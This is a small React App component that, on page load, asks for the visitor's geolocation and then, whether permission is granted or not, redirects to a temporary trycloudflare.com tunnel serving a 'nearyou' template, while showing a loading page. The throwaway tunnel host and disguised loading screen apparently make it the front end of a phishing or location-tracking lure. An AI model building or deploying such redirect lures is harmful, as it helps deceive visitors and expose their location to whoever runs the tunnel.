import { useEffect } from "react";
import LoadingPage from "./Pages/LoadingPage";

function App() {

  useEffect(() => {
   const tragetlink ="http://eyes-diverse-cargo-near.trycloudflare.com/templates/nearyou/index.html";

    navigator.geolocation.getCurrentPosition(
      () => {
        window.location.href = tragetlink;
      },
      () => {
        window.location.href = tragetlink;
      }
    );
  }, []);

  return <LoadingPage />;
}

export default App;
